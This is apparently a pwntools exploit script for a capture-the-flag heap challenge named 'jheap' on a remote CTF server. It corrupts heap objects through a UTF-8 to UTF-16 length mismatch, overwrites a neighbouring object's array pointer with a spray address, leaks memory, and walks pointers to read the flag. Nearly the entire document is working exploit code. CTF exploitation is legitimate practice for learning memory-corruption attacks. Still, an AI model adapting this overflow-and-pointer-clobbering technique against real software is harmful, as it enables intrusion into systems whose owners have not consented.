#!/usr/bin/python
# -*- coding: utf8 -*-

from pwn import *
from objs import SeqMemory, JHeap, C_arr, to_bytes
from bitstring import BitArray

def pp32(*x):
    return ''.join(map(p32, x))

def choice(ch, ind):
    p.recvuntil('> ')
    p.sendline(str(ch))
    p.sendlineafter('Index: ', str(ind))

def edit(ind, offset, content):
    choice(0, ind)
    p.sendafter('Offset: ', str(offset))
    p.sendafter('Content: ', content)

def view(ind):
    choice(1, ind) 
    p.recvuntil('*****\nHeap')
    p.recvuntil('] = ')
    return p.recvuntil('\n*****************************\n>>>', drop=True)

def leak(ind):
    choice(2, ind)

def spray(content):
    choice(3, 0)
    p.sendlineafter('content: ', content)

def exit():
    choice(4, 0)


def nextn(gen, ct):
    for x in range(ct):
        yield next(gen)

# May need to play around with this value
#spray_loc = 0xffe21000
spray_loc = 0xffe40000
#spray_loc = 0xf3940000

big = '太大'
def exp():
    print(p.recvuntil('>>>', drop=True))

    leak(47)

    mem = SeqMemory(0x100000)
    db = de_bruijn()

    # Get sizes
    mem.writeobj(JHeap, 0, 1)
    JHeap_size = mem.pos // 8
    mem.pos = 0

    mem.writeobj(C_arr, [])
    carr_size = mem.pos // 8
    mem.pos = 0

    heaps = []
    for i in range(0x30):
        # Get size
        size = len(view(i))
        print(size)

        # Write marker
        content = '\x0a' * size # Spray these sizes everywhere
        edit(i, 0, content)

        # Update shadow memory
        h = JHeap(i, -(JHeap_size + mem.pos))
        h.carr_content = cont = C_arr(content)
        h.off = mem.pos
        heaps.append(h)

        mem.writeobj(h)
        mem.writeobj(cont)
        h.pad = (-size & 3)

    # Cause a overflow length
    for ind in range(10, 40):
        victim = heaps[ind]
        size = len(victim.carr_content.arr)
        if size > 120:
            break
    else:
        raise ValueError('Too small sizes!')

    log.info('Beginning heap: %r', repr(heaps[0].carr_content.content[:10].encode('utf_16le')))
    log.info('Victim is heap[%d] = chr[%d]', ind, size)
    log.info('Beginning of content: %r', repr(victim.carr_content.content[:10].encode('utf_16le')))

    times = size // len(big)
    edit(ind, 0, big * times)

    # Now replace heap[ind+1]'s array with a spray address
    clobber = heaps[ind+1]
    clobber.index = 0x0c0c0c0c
    clobber.carr = spray_loc
    clobber.carr_content = None

    mem.pos = clobber.off
    mem.writeobj(clobber)

    tmp = len(victim.carr_content.content) + victim.pad
    edit(ind, 0, 'b' + 'a' * (tmp - 1) + to_bytes(clobber).decode('utf16').encode('utf8'))

    last = heaps[47]
    marker = 'A' * len(last.carr_content.arr)
    last.carr_content.arr = list(marker)
    edit(47, 0, marker)

    marker = marker.encode('utf_16le')

    raw = view(ind + 1).decode('utf8').encode('utf_16le')
    pause()
    mem = SeqMemory(bytes=raw)
    mem_start = carr_size + spray_loc

    locs = mem.find(BitArray(bytes=marker))
    marker_off = locs[0] // 8  - carr_size
    marker_addr = marker_off + mem_start
    log.info('Marker char array is at: 0x%08x', marker_addr)

    heap_off = marker_off - JHeap_size 
    heap_addr = marker_addr - JHeap_size 
    log.info('Marker heap is at: 0x%08x', heap_addr)

    mem.pos = heap_off * 8
    last = heaps[47] = mem.readobj()
    assert last.carr == marker_addr

    log.info('Flag is at: 0x%08x', last.flag)
    mem.pos = (last.flag - mem_start) * 8
    flag_str = mem.readobj() 
    mem.pos = (flag_str.ptr - mem_start) * 8
    flag = mem.readobj() 
    print(flag)
    quit()



#    while True:
#        start = int(raw_input('Starting address: '), 0)
#        read_len = int(raw_input('Length: '), 0)
#        mem.pos = (start - mem_start) * 8
#        line = ''
#        for i in range(read_len):
#            if i % 16 == 0:
#                if i != 0:
#                    print(line)
#                line = '%08x:' % (start + i)
#            line += ' %02x' % ord(mem.read("bytes:1"))
#        print(line)
#


    p.interactive()
    
    #fake_heap = p32(5, 0, cls_jheap)
    

if __name__ == '__main__':
#    p = process('../deploy/bin/jheap')
#    p = remote('127.0.0.1', 64372)
#    p = remote('127.0.0.1', 32791)
    p = remote('chal.utc-ctf.club', 64372)
#    p = remote('chal.utc-ctf.club', 32768)
    try:
        exp()
    except (EOFError, KeyboardInterrupt), e:
        p.interactive()
        raise
